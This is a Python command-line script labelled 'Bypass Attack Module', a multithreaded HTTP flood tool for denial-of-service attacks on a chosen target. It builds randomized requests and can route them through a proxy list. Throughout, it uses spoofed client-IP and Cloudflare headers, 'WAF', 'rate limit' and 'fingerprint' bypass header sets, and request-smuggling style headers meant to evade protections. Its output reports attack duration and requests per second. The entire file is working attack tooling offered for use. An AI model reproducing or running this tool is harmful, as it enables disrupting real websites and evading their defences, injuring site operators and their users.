#!/usr/bin/env python3
import argparse
import os
import sys
import time
import random
import json
import socket
import ssl
import threading
import hashlib
from concurrent.futures import ThreadPoolExecutor

# ===== ANSI COLORS =====
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ===== DEFAULT USER AGENTS =====
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
]

# ===== WAF BYPASS HEADERS =====
WAF_BYPASS_HEADERS = [
    "X-Forwarded-For: {ip}",
    "X-Real-IP: {ip}",
    "X-Client-IP: {ip}",
    "X-Originating-IP: {ip}",
    "X-Remote-IP: {ip}",
    "X-Remote-Addr: {ip}",
    "X-Forwarded-Host: {host}",
    "X-Host: {host}",
    "X-Forwarded-Proto: https",
    "Forwarded: for={ip};host={host};proto=https",
    "CF-Connecting-IP: {ip}",
    "True-Client-IP: {ip}",
    "X-Forwarded-For: 127.0.0.1, {ip}",
    "X-Real-IP: 10.0.0.1",
    "X-Client-IP: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
]

# ===== HTTP METHODS =====
HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH",
    "GET", "POST", "GET", "GET", "GET", "GET", "POST", "HEAD",
]

# ===== REQUEST PATHS =====
PATHS = [
    "/", "/index.php", "/api/v1/status", "/api/v2/status", "/health", "/healthz",
    "/status", "/ping", "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/wp-admin/admin-ajax.php", "/api/v1/users", "/api/v1/products",
    "/api/v1/login", "/login", "/auth", "/api", "/api/v1/health",
    "/server-status", "/server-info", "/.env", "/config.php",
    "/index.html", "/index.php", "/main", "/home", "/dashboard",
    "/api/v1/data", "/graphql", "/api/graphql", "/v1", "/v2",
    "/public", "/static", "/assets/js/app.js", "/assets/css/style.css",
    "/api/v1/orders", "/api/v1/customers", "/api/v1/products", "/api/v1/settings",
    "/actuator", "/actuator/health", "/metrics", "/prometheus", "/healthcheck",
    "/status", "/health", "/api/health", "/api/v1/health", "/api/v2/health",
    "/openapi.json", "/swagger", "/swagger.json", "/api-docs", "/api/docs",
    "/api/v1/account", "/api/v1/user", "/api/v1/me", "/api/v1/session",
    "/api/v1/token", "/api/v1/auth", "/api/v1/authenticate", "/oauth/token",
    "/api/v1/upload", "/upload", "/upload.php", "/file", "/files",
    "/api/v1/files", "/api/v1/download", "/download", "/downloads",
    "/api/v1/search", "/search", "/find", "/query", "/api/v1/query",
    "/api/v1/execute", "/run", "/exec", "/cmd", "/command",
    "/api/v1/admin", "/admin", "/administrator", "/admin.php",
    "/api/v1/config", "/config", "/settings", "/api/v1/settings",
    "/api/v1/users", "/users", "/user", "/api/v1/user",
    "/api/v1/email", "/email", "/contact", "/contactus", "/api/v1/contact",
]

# ===== QUERY STRING PATTERNS =====
QUERY_PATTERNS = [
    "page={n}", "id={n}", "user={n}", "name={n}", "q={n}", "query={n}",
    "search={n}", "term={n}", "keyword={n}", "key={n}", "value={n}",
    "category={n}", "type={n}", "format={n}", "action={n}", "action=view",
    "page=1&id={n}", "page={n}&limit=10", "page={n}&per_page=10",
    "page={n}&size=10", "page={n}&page_size=10", "offset={n}&limit=10",
    "start={n}&end={n}", "from={n}&to={n}", "min={n}&max={n}",
    "sort=asc&page={n}", "sort=desc&page={n}", "order=asc&page={n}",
    "order=desc&page={n}", "filter=active&page={n}", "status=active&page={n}",
    "id={n}&action=view", "id={n}&action=edit", "id={n}&action=delete",
    "id={n}&action=update", "id={n}&action=create", "id={n}&action=list",
]

# ===== COOKIE TEMPLATES =====
COOKIE_TEMPLATES = [
    "session_id={hash}; user_id={n}; _ga=GA1.2.{n}.{n}",
    "PHPSESSID={hash}; user={n}; _gid=GA1.2.{n}.{n}",
    "token={hash}; auth={hash}; _fbp=fb.1.{n}.{n}",
    "SESSION={hash}; user_id={n}; _gcl_au=1.1.{n}.{n}",
    "JSESSIONID={hash}; userId={n}; _uetsid={hash}",
]

# ===== CLOUDFLARE BYPASS HEADERS =====
CF_BYPASS_HEADERS = [
    "CF-Connecting-IP: {ip}",
    "CF-IPCountry: US",
    "CF-Ray: {hash}",
    "CF-Visitor: {{\"scheme\":\"https\"}}",
    "CF-Worker: {host}",
    "CF-Cache-Status: DYNAMIC",
    "CF-Request-ID: {hash}",
    "CF-EW-Via: {hash}",
    "CF-Pseudo-IPv4: {ip}",
    "CF-HTTP2-Prior-Knowledge: 1",
    "CF-TLS-Version: TLSv1.3",
    "CF-TLS-Cipher: TLS_AES_128_GCM_SHA256",
    "CF-Public-Key-Pins-Report-Only: {hash}",
]

# ===== TOR BROWSER HEADERS =====
TOR_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate, br",
    "Cache-Control: no-cache",
    "Pragma: no-cache",
    "Upgrade-Insecure-Requests: 1",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1",
]

# ===== HTTP/2 CIPHER SUITES =====
HTTP2_CIPHERS = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-SHA256",
    "ECDHE-ECDSA-AES256-SHA384",
]

# ===== REFERER TEMPLATES =====
REFERERS = [
    "https://www.google.com/search?q=website",
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://www.linkedin.com/",
    "https://www.amazon.com/",
    "https://www.ebay.com/",
    "https://www.aliexpress.com/",
    "https://www.tiktok.com/",
    "https://web.whatsapp.com/",
    "https://t.me/",
    "https://www.wikipedia.org/",
    "https://news.ycombinator.com/",
]

# ===== ACCEPT HEADERS =====
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "application/json, text/javascript, */*; q=0.01",
    "text/plain, */*; q=0.01",
]

# ===== ACCEPT_LANGUAGE HEADERS =====
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en-US,en;q=0.9,pt;q=0.8",
    "en-US,en;q=0.9,it;q=0.8",
    "en-US,en;q=0.9,nl;q=0.8",
    "en-US,en;q=0.9,pl;q=0.8",
]

# ===== SEC-CH-UA HEADERS =====
SEC_CH_UA = [
    '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    '"Google Chrome";v="124", "Chromium";v="124", "Not.A/Brand";v="99"',
    '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    '"Google Chrome";v="123", "Chromium";v="123", "Not.A/Brand";v="98"',
    '"Google Chrome";v="122", "Chromium";v="122", "Not.A/Brand";v="97"',
]

# ===== SEC-FETCH HEADERS =====
SEC_FETCH_HEADERS = [
    "Sec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1",
    "Sec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document",
    "Sec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin",
]

# ===== BYPASS TECHNIQUES =====
BYPASS_TECHNIQUES = [
    "waf", "cloudflare", "rate_limit", "captcha", "fingerprint", "http2", "tls", "http_request_smuggling",
]

def print_colored(text, color=WHITE, end='\n'):
    sys.stdout.write(f"{color}{text}{RESET}{end}")
    sys.stdout.flush()

def generate_hash(length=32):
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:length]

def generate_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def generate_random_id():
    return str(random.randint(1, 999999999))

def build_basic_headers(target, technique=None):
    ip = generate_random_ip()
    host = target
    ua = random.choice(DEFAULT_USER_AGENTS)
    accept = random.choice(ACCEPT_HEADERS)
    accept_lang = random.choice(ACCEPT_LANGUAGES)
    sec_ch_ua = random.choice(SEC_CH_UA)
    referer = random.choice(REFERERS)
    sec_fetch = random.choice(SEC_FETCH_HEADERS)

    headers = [
        f"Host: {host}",
        f"User-Agent: {ua}",
        f"Accept: {accept}",
        f"Accept-Language: {accept_lang}",
        f"Accept-Encoding: gzip, deflate, br",
        f"Cache-Control: no-cache",
        f"Pragma: no-cache",
        f"Upgrade-Insecure-Requests: 1",
        f"Sec-CH-UA: {sec_ch_ua}",
        f"Sec-CH-UA-Mobile: ?0",
        f"Sec-CH-UA-Platform: \"Windows\"",
        f"Referer: {referer}",
        f"Origin: https://{host}",
        sec_fetch,
    ]
    return headers

def build_waf_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    hash_val = generate_hash(16)
    headers = build_basic_headers(target, "waf")
    waf_headers = [
        f"X-Forwarded-For: {ip}",
        f"X-Real-IP: {ip}",
        f"X-Client-IP: {ip}",
        f"X-Originating-IP: {ip}",
        f"X-Remote-IP: {ip}",
        f"X-Remote-Addr: {ip}",
        f"X-Forwarded-Host: {host}",
        f"X-Host: {host}",
        f"X-Forwarded-Proto: https",
        f"Forwarded: for={ip};host={host};proto=https",
        f"True-Client-IP: {ip}",
        f"CF-Connecting-IP: {ip}",
    ]
    headers.extend(waf_headers)
    return headers

def build_cf_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    hash_val = generate_hash(16)
    headers = build_basic_headers(target, "cloudflare")
    cf_headers = [
        f"CF-Connecting-IP: {ip}",
        "CF-IPCountry: US",
        f"CF-Ray: {hash_val}",
        "CF-Visitor: {\"scheme\":\"https\"}",
        f"CF-Worker: {host}",
        "CF-Cache-Status: DYNAMIC",
        f"CF-Request-ID: {hash_val}",
        f"CF-EW-Via: {hash_val}",
        f"CF-Pseudo-IPv4: {ip}",
        "CF-HTTP2-Prior-Knowledge: 1",
        "CF-TLS-Version: TLSv1.3",
        "CF-TLS-Cipher: TLS_AES_128_GCM_SHA256",
    ]
    headers.extend(cf_headers)
    return headers

def build_rate_limit_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    headers = build_basic_headers(target, "rate_limit")
    rate_headers = [
        f"X-Forwarded-For: {ip}",
        f"X-Real-IP: {ip}",
        f"X-Client-IP: {generate_random_ip()}",
        f"X-Originating-IP: {generate_random_ip()}",
        f"X-Forwarded-For: 127.0.0.1, {ip}",
        f"X-Forwarded-For: {generate_random_ip()}, {ip}",
        f"X-Forwarded-For: {ip}, {generate_random_ip()}",
        f"Forwarded: for={ip}",
        f"X-Forwarded-Host: {host}",
        f"X-Host: {host}",
    ]
    headers.extend(rate_headers)
    return headers

def build_fingerprint_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    headers = build_basic_headers(target, "fingerprint")
    fp_headers = [
        f"X-Forwarded-For: {ip}",
        f"X-Real-IP: {ip}",
        "Accept-CH: Sec-CH-UA, Sec-CH-UA-Full-Version, Sec-CH-UA-Full-Version-List",
        "Accept-CH-Lifetime: 86400",
        "Accept-CH-Prefers-Color-Scheme: light",
        "Accept-CH-Prefers-Reduced-Motion: no-preference",
        "Accept-CH-Viewport-Width: 1920",
        "Accept-CH-Viewport-Height: 1080",
        "Accept-CH-Device-Memory: 8",
        "Accept-CH-DPR: 1",
        "Accept-CH-UA-Mobile: ?0",
        "Accept-CH-UA-Model: \"\"",
        "Accept-CH-UA-Platform: \"Windows\"",
    ]
    headers.extend(fp_headers)
    return headers

def build_http2_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    headers = build_basic_headers(target, "http2")
    h2_headers = [
        f"X-Forwarded-For: {ip}",
        "Upgrade: h2c",
        "HTTP2-Settings: AAMAAABkAAQAAP__",
        "Connection: Upgrade, HTTP2-Settings",
        "Accept-HTTP2: 1",
        "Accept: */*",
        f"X-Forwarded-Proto: https",
    ]
    headers.extend(h2_headers)
    return headers

def build_tls_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    cipher = random.choice(HTTP2_CIPHERS)
    hash_val = generate_hash(16)
    headers = build_basic_headers(target, "tls")
    tls_headers = [
        f"X-Forwarded-For: {ip}",
        f"X-TLS-Version: TLSv1.3",
        f"X-TLS-Cipher: {cipher}",
        f"X-TLS-Client-Cert: {hash_val}",
        f"X-TLS-Client-Random: {hash_val}",
        f"X-TLS-Session-ID: {hash_val}",
        f"X-TLS-Alpn: h2, http/1.1",
        f"X-TLS-SNI: {host}",
    ]
    headers.extend(tls_headers)
    return headers

def build_smuggling_bypass_headers(target):
    ip = generate_random_ip()
    host = target
    hash_val = generate_hash(16)
    headers = build_basic_headers(target, "http_request_smuggling")
    smuggle_headers = [
        f"X-Forwarded-For: {ip}",
        "Transfer-Encoding: chunked",
        "Content-Length: 0",
        "Connection: keep-alive",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Override-URL: /admin",
        f"X-Forwarded-Host: {host}",
        f"X-HTTP-Method-Override: POST",
        "X-HTTP-Method: POST",
        "X-Method-Override: POST",
    ]
    headers.extend(smuggle_headers)
    return headers

def get_headers_for_technique(target, technique):
    if technique == "waf":
        return build_waf_bypass_headers(target)
    elif technique == "cloudflare":
        return build_cf_bypass_headers(target)
    elif technique == "rate_limit":
        return build_rate_limit_bypass_headers(target)
    elif technique == "fingerprint":
        return build_fingerprint_bypass_headers(target)
    elif technique == "http2":
        return build_http2_bypass_headers(target)
    elif technique == "tls":
        return build_tls_bypass_headers(target)
    elif technique == "http_request_smuggling":
        return build_smuggling_bypass_headers(target)
    elif technique == "captcha":
        return build_basic_headers(target, "captcha")
    else:
        return build_basic_headers(target, None)

def build_request(target, port, technique, proxy=None, use_https=False):
    ip = generate_random_ip()
    host = target
    scheme = "https" if use_https or port == 443 else "http"
    path = random.choice(PATHS)
    query = random.choice(QUERY_PATTERNS).replace("{n}", str(random.randint(1, 99999)))
    full_path = f"{path}?{query}" if query else path

    headers = get_headers_for_technique(target, technique)

    method = random.choice(HTTP_METHODS)
    if method in ["POST", "PUT", "PATCH"]:
        body = f"{{'id': {random.randint(1,9999)}, 'data': '{generate_hash(8)}'}}"
        content_length = len(body)
        headers.append(f"Content-Type: application/json")
        headers.append(f"Content-Length: {content_length}")
        request_line = f"{method} {full_path} HTTP/1.1"
        headers_str = "\n".join(headers)
        full_request = f"{request_line}\n{headers_str}\n\n{body}"
    else:
        request_line = f"{method} {full_path} HTTP/1.1"
        headers_str = "\n".join(headers)
        full_request = f"{request_line}\n{headers_str}\n\n"

    return full_request, scheme, host, path

class BypassAttack:
    def __init__(self, target, port, threads, duration, spoof=False, technique=None, proxies=None, use_https=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.technique = technique or random.choice(BYPASS_TECHNIQUES)
        self.proxies = proxies or []
        self.use_https = use_https
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.request_count = 0
        self.error_count = 0
        self.start_time = None

    def _send_request(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                request, scheme, host, path = build_request(
                    self.target, self.port, self.technique,
                    proxy=random.choice(self.proxies) if self.proxies else None,
                    use_https=self.use_https
                )

                if self.proxies:
                    proxy = random.choice(self.proxies)
                    proxy_host, proxy_port = proxy.rsplit(":", 1)
                    proxy_port = int(proxy_port)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((proxy_host, proxy_port))

                    if self.use_https or self.port == 443:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.target)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.target, self.port))

                    if self.use_https or self.port == 443:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.target)

                sock.send(request.encode())
                with self.lock:
                    self.request_count += 1

                time.sleep(0.01)
            except Exception:
                with self.lock:
                    self.error_count += 1
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def start(self):
        self.start_time = time.time()
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_request)
            t.daemon = True
            t.start()
            threads.append(t)

        print_colored(f"\n[*] Bypass technique: {self.technique.upper()}", CYAN)
        print_colored(f"[*] Target: {self.target}:{self.port}", CYAN)
        print_colored(f"[*] Threads: {self.threads}, Duration: {self.duration}s", CYAN)
        print_colored(f"[*] Proxies: {len(self.proxies) if self.proxies else 'Direct'}", CYAN)
        print_colored(f"[*] HTTPS: {'Yes' if self.use_https else 'No'}", CYAN)
        print_colored("[*] Attack started...\n", YELLOW)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

        elapsed = time.time() - self.start_time
        print_colored(f"\n[✓] Attack selesai dalam {elapsed:.2f} detik", GREEN)
        print_colored(f"[✓] Total requests: {self.request_count}", GREEN)
        print_colored(f"[✓] Total errors: {self.error_count}", GREEN)
        print_colored(f"[✓] Requests per second: {int(self.request_count / elapsed) if elapsed > 0 else 0}", GREEN)

def attack(target, port, threads, duration, spoof=False, technique=None, proxies=None, use_https=False):
    flood = BypassAttack(target, port, threads, duration, spoof, technique, proxies, use_https)
    flood.start()

def main():
    parser = argparse.ArgumentParser(description="Bypass Attack Module")
    parser.add_argument("--target", required=True, help="Target IP or domain")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--technique", choices=BYPASS_TECHNIQUES, help="Bypass technique")
    parser.add_argument("--proxy", action="store_true", help="Use proxies from proxy.txt")
    parser.add_argument("--https", action="store_true", help="Use HTTPS/SSL")
    args = parser.parse_args()

    proxies = []
    if args.proxy:
        try:
            with open("proxy.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print_colored("[!] proxy.txt tidak ditemukan", RED)

    attack(args.target, args.port, args.threads, args.duration, False, args.technique, proxies, args.https)

if __name__ == "__main__":
    main()
